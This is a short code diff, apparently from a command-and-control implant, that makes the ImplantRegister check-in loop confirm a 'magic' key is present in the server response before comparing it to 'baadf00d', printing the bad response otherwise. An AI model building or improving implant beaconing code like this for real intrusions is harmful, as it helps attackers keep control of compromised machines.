@@ -30,9 +30,13 @@ VOID ImplantRegister() {
             continue;
         }
 
-        magic = response["magic"].get<string>();
-        if (!magic.compare( "baadf00d" ))
-            return;
+        if (response.contains( "magic" )) {
+            magic = response["magic"].get<string>();
+            if (!magic.compare( "baadf00d" ))
+                return;
+        } else {
+            printf( "Invalid server response: %s\n", response.dump( 4 ).c_str() );
+        }
 
         Sleep( 5000 );
     }
